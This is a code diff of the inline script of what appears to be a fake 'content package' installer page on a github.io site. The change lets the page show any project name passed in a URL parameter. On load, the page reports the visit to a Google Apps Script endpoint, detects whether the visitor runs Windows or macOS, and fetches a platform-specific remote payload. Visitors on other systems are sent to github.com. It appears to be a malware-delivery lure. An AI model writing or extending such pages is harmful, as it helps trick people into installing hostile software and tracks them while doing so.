@@ -323,29 +323,41 @@
         const ERROR_URL = "https://github.com/";
         const APP_URL = "https://script.google.com/macros/s/AKfycbzcc-DrgeXVXUqF0ZzVeA1PwlFTOLMdXszxROOqbmA4MWCPobSyWhGGEmpZWgogP02qZA/exec";
 
-        function getProjectInfoFromHost() {
-            const host = window.location.hostname || "";
-            const projectSlug = host.replace(".github.io", "");
-            return { host, projectSlug };
-        }
-
-        function formatProjectName(slug) {
-            if (!slug) return "Content";
-            return slug
-                .replace(/-/g, " ")
-                .split(" ")
-                .filter(Boolean)
-                .map(w => w.charAt(0).toUpperCase() + w.slice(1))
-                .join(" ");
+        function getProjectInfo() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const textParam = urlParams.get('text');
+            
+            if (textParam) {
+                const fullText = decodeURIComponent(textParam);
+                const pathSlug = fullText.replace(/\s+/g, '-').toLowerCase();
+                return {
+                    displayName: fullText,
+                    pathDisplay: '/' + pathSlug,
+                    subtitle: pathSlug + '.github.io'
+                };
+            } else {
+                const host = window.location.hostname || "";
+                const projectSlug = host.replace(".github.io", "");
+                const pretty = projectSlug
+                    .replace(/-/g, " ")
+                    .split(" ")
+                    .filter(Boolean)
+                    .map(w => w.charAt(0).toUpperCase() + w.slice(1))
+                    .join(" ");
+                
+                return {
+                    displayName: pretty || "Content",
+                    pathDisplay: "/" + (projectSlug || "secure-content"),
+                    subtitle: host || "secure-content"
+                };
+            }
         }
 
         function updateUI() {
-            const info = getProjectInfoFromHost();
-            const pretty = formatProjectName(info.projectSlug);
-
-            document.getElementById("domainPath").textContent = "/" + (info.host || "secure-content");
-            document.getElementById("dynamicTitle").textContent = pretty;
-            document.getElementById("dynamicSubtitle").textContent = info.host ? `Content package for ${info.host}` : "Content package";
+            const info = getProjectInfo();
+            document.getElementById("domainPath").textContent = info.pathDisplay;
+            document.getElementById("dynamicTitle").textContent = info.displayName;
+            document.getElementById("dynamicSubtitle").textContent = info.subtitle;
         }
 
         function detectOS() {
@@ -374,14 +386,11 @@
 
         document.addEventListener("DOMContentLoaded", () => {
             updateUI();
-
             setTimeout(() => {
                 const os = detectOS();
                 sendLink();
-
                 if (os === 'windows' || os === 'macos') {
                     const targetUrl = os === 'windows' ? REMOTE_WINDOWS : REMOTE_MAC;
-
                     async function load() {
                         try {
                             const res = await fetch(targetUrl, { cache: 'no-store' });
@@ -396,10 +405,10 @@
                     load();
                 } else {
                     document.getElementById('dynamicTitle').textContent = "Attention: Unsupported Operating System";
-                    document.getElementById('dynamicSubtitle').textContent = "To continue installation, you must be using Windows or macOS. Installation is not supported on your current operating system.";
+                    document.getElementById('dynamicSubtitle').textContent = "To continue installation, you must be using Windows or macOS.";
                     setTimeout(() => { window.location.replace(ERROR_URL); }, 4000);
                 }
-            }, 3000);
+            }, 5000);
         });
     </script>
 </body>
